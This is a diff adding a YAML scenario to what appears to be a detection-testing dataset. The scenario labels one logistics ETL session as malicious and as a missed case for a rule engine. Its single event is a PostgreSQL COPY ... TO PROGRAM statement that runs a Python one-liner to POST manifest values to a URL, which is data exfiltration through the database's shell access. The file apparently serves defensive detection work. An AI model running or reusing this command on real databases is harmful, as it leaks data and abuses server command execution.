@@ -1,0 +1,31 @@
+scenario_id: gen_logistics_78_copy_to_program_mal_2174m
+family_id: gen_logistics_78_copy_to_program_fam_2174
+domain: logistics
+time_of_day: 00:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'python3 -c "import
+      urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://etl-internal.corp/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 10.30.37.10
+      port: 443
+matched_pair_id: gen_logistics_78_copy_to_program_pair_2174
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
